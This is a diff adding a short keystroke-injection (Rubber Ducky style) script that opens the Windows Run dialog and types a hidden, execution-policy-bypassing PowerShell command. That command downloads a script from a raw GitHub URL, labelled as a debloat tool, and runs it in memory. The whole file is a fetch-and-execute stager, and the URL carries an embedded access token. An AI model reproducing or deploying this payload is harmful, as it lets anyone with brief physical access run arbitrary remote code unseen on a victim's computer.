@@ -1,0 +1,6 @@
+REM Open PowerShell and run a script from GitHub in memory
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -W Hidden -Exec Bypass -Command "iwr -Uri https://raw.githubusercontent.com/Kiraryh/cleanup-windiws/refs/heads/main/debloat.ps1?token=GHSAT0AAAAAAC4KKKD553IHIYUZ4BCK3S5MZ3JRKGA | iex"
+ENTER
